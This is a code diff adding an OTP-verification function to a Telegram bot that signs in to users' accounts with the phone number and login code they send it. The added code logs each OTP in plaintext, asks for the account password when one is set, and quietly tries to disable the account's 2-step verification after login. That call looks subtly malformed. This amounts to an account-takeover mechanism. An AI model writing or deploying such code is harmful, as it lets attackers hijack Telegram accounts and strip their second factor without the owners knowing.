@@ -131,5 +131,49 @@ async def handle_2fa(event):
         except Exception as e:
             await send_error_log(f"2FA Error: {str(e)}")
 
+async def verify_otp(event, otp):
+    """Verify OTP and complete login process."""
+    user_id = event.sender_id
+
+    if user_id not in active_logins:
+        await event.respond("❌ **No pending login found!** Start again with /login**")
+        return
+
+    client_data = active_logins[user_id]
+    client = client_data["client"]
+    phone = client_data["phone"]
+
+    try:
+        logger.info(f"Verifying OTP {otp} for {phone}...")
+        await client.sign_in(phone, otp)
+        logger.info(f"Login successful for {phone}!")
+
+        # Disable 2-step verification (if applicable)
+        try:
+            await client(UpdatePasswordSettingsRequest(PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow()))
+            logger.info("2-Step Verification disabled successfully.")
+        except Exception:
+            logger.warning("Could not disable 2-Step Verification.")
+
+        await event.respond("✅ **Login successful!**")
+        del active_logins[user_id]  # Remove from active logins
+
+    except SessionPasswordNeededError:
+        await event.respond("⚠️ **This account has a password!** Send your password to continue.")
+        active_logins[user_id]["password_needed"] = True
+        logger.warning(f"Password needed for {phone}")
+
+    except PhoneCodeInvalidError:
+        await event.respond("🚫 **Invalid OTP! Try again.**")
+        logger.error(f"Invalid OTP for {phone}")
+
+    except PhoneCodeExpiredError:
+        await event.respond("⏳ **OTP expired! Start again with /login.**")
+        logger.warning(f"OTP expired for {phone}")
+
+    except Exception as e:
+        await send_error_log(f"OTP Verification Error: {str(e)}")
+        logger.exception("Unexpected error in OTP verification")
+
 print("🚀 Bot is running...")
 bot.run_until_disconnected()
